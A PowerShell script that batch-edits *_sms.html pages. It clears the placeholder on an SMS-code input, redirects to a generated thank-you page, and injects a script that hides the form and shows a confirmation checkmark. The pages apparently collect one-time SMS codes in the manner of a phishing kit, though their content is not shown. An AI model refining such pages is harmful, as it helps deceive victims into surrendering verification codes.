$files = Get-ChildItem -Path . -Filter *_sms.html

$thankyouScript = @"
<script>
window.onload = function() {
    var tyDiv = document.createElement('div');
    tyDiv.style.textAlign = 'center';
    tyDiv.style.padding = '40px 20px';
    tyDiv.style.marginTop = '20px';
    tyDiv.style.fontFamily = 'Arial, sans-serif';
    
    var h1 = document.createElement('h1');
    h1.textContent = 'Thank you';
    h1.style.fontSize = '32px';
    h1.style.color = '#333';
    h1.style.marginBottom = '20px';
    
    var img = document.createElement('img');
    img.src = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"><circle cx="26" cy="26" r="25" fill="%234CAF50"/><path fill="none" stroke="%23fff" stroke-width="5" d="M14.1 27.2l7.1 7.2 16.7-16.8"/></svg>';
    img.style.width = '80px';
    img.style.height = '80px';
    img.style.margin = '0 auto';
    img.style.display = 'inline-block';
    
    tyDiv.appendChild(h1);
    tyDiv.appendChild(img);
    
    var mainForm = document.querySelector('form');
    if (mainForm) {
        var p = mainForm.parentElement;
        mainForm.style.display = 'none';
        p.appendChild(tyDiv);
    } else {
        document.body.innerHTML = '';
        document.body.appendChild(tyDiv);
    }
    
    // Hide extra form elements
    var extra = document.querySelectorAll('.form-group, ion-item, p, span:not(.logo), label, button, a');
    for(var i=0; i<extra.length; i++) {
        if (!tyDiv.contains(extra[i])) {
            extra[i].style.display = 'none';
        }
    }
};
</script>
"@

foreach ($file in $files) {
    $content = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
    
    # 1. Update SMS file: remove placeholder and redirect to Thank You
    $thankyouFileName = $file.Name.Replace("_sms.html", "_thankyou.html")
    
    $content = [regex]::Replace($content, "smsInp\.placeholder\s*=\s*'[^']*';", "smsInp.placeholder = '';")
    $content = [regex]::Replace($content, "alert\('Code accept.*?'\);", "window.location.href = '$thankyouFileName';")
    
    [System.IO.File]::WriteAllText($file.FullName, $content, [System.Text.Encoding]::UTF8)
    
    # 2. Create Thank You file
    $tyContent = [regex]::Replace($content, "(?s)<script>\s*setInterval\(function\(\).*?</script>", $thankyouScript)
    
    $tyPath = Join-Path -Path $file.DirectoryName -ChildPath $thankyouFileName
    [System.IO.File]::WriteAllText($tyPath, $tyContent, [System.Text.Encoding]::UTF8)
    
    Write-Host "Processed $($file.Name) and created $thankyouFileName"
}
